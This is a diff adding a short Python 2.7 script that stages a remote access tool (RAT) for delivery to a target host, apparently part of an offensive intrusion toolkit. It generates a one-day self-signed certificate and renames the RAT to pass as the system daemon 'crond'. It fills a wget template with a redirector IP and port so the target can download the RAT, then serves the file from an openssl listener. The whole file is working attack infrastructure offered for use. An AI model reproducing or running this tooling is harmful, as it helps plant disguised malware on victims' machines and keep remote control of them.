@@ -1,0 +1,93 @@
+#! /usr/local/bin/python2.7
+import os
+import optparse
+import subprocess
+import sys
+
+VERSION="1.0.0.0"
+
+##
+## Make keys
+def makeKeys():
+    subprocess.Popen("openssl req -nodes -x509 -newkey rsa:2048 -days 1 -out /current/tmp/cert.pem -keyout /current/tmp/key.pem -batch", shell=True).wait()
+    
+## Start Listener
+def listen(port):
+    cmd = "openssl s_server -accept "+port+" -key /current/tmp/key.pem -cert /current/tmp/cert.pem -WWW"
+    print cmd
+    try:
+        subprocess.Popen(cmd, shell=True, cwd="/current/tmp").communicate()
+    except KeyboardInterrupt:
+        exit()
+    
+## Create pasteable file
+def makePasteable(redir, port, rat):
+    sed = "sed -e s/RATUP_CBIP/"+redir+"/g -e s/RATUP_CBPORT/"+port+"/g -e s/RAT_NAME/"+rat+"/g /current/etc/wget.template > /current/etc/wget.pop"
+    subprocess.Popen(sed, shell=True).wait()
+
+## Make Rat
+def makeRat(ratName, remoteRatName):
+    copy = "cp "+ratName+" /current/tmp/"+remoteRatName 
+    subprocess.Popen(copy, shell=True).wait()
+
+## 
+
+def main():
+    # Parse commandline options
+    parser = optparse.OptionParser()
+    parser.add_option("-l", "--redirector", dest = "redirector",
+        default = "", help = "(req) Redirector IP Address")
+    parser.add_option("-p", "--port", dest = "port",
+        default = "", help = "(req) Redirector Port")
+    parser.add_option("-r", "--rat", dest = "rat",
+        default = "", help = "(req) Full path to RAT")
+    parser.add_option("-R", "--remoteRat", dest = "remoteRat",
+        default = "crond", help = "(opt) Target RAT Name (default: crond)")
+    parser.add_option("-V","--version", dest = "version",
+        action = "store_true", help = "Displays version information")
+    (options, args) = parser.parse_args()
+
+    redirector = options.redirector
+    port = options.port
+    rat = options.rat
+    remoteRat = options.remoteRat
+    version = options.version
+
+    if (version):
+        print "%s: version %s" % (sys.argv[0],VERSION)
+        exit()
+
+    if (redirector == ""):
+        parser.print_help()
+        exit()
+    
+    elif (port == ""):
+        parser.print_help()
+        exit()
+
+    elif (rat == ""):
+        parser.print_help()
+        exit()
+
+    
+    #Make the keys
+    makeKeys()
+   
+    #Make the rat
+    makeRat(options.rat, options.remoteRat)
+     
+    # Pop up our pasteables
+    makePasteable(options.redirector, options.port, options.remoteRat)
+    subprocess.Popen("1x -geometry 110x30+5+320 -bg white -e vi /current/etc/wget.pop", shell=True) 
+
+    #Start our Listener
+    print"#############################################"
+    print"Control-C and close this window when done! :)"
+    print"#############################################"
+    listen(options.port);
+
+
+if (__name__ == '__main__'):
+    main()
+
+
